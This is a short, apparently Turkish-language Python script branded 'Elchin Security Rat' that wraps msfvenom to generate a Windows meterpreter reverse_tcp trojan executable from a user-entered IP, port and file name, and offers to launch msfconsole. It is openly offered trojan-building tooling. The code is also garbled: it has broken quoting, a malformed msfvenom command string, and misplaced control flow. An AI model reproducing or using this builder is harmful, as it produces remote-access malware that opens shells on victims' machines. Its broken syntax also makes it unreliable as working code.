import os

os.system("clear")

banner=***
___________.__         .__    .__           _________                          .__  __           __________         __    ____   ________ 
\_   _____/|  |   ____ |  |__ |__| ____    /   _____/ ____   ____  __ _________|__|/  |_ ___.__. \______   \_____ _/  |_  \   \ /   /_   |
 |    __)_ |  | _/ ___\|  |  \|  |/    \   \_____  \_/ __ \_/ ___\|  |  \_  __ \  \   __<   |  |  |       _/\__  \\   __\  \   Y   / |   |
 |        \|  |_\  \___|   Y  \  |   |  \  /        \  ___/\  \___|  |  /|  | \/  ||  |  \___  |  |    |   \ / __ \|  |     \     /  |   |
/_______  /|____/\___  >___|  /__|___|  / /_______  /\___  >\___  >____/ |__|  |__||__|  / ____|  |____|_  /(____  /__|      \___/   |___|
        \/           \/     \/        \/          \/     \/     \/                       \/              \/      \/                       
        ***
print(banner)

print(***
1)Trojan Oluştur(yarat)
2)Metasploiti aç***)
girdi=raw_input(*--------->")

if (girdi==1):

        ip=raw_input(*ip adresi girin!---->")
        port=raw_input("portu girin-------->")
        isminiz=raw_input("trojan ismi(adi)-------->")

os.system("clear && msfvenom -p windows/meterpreter/reverse_tcp LHOST"+ip" LPORT="+port+" -f exe -o "+isminiz)        
if (girdi==2):
        os.system("msfconsole")
        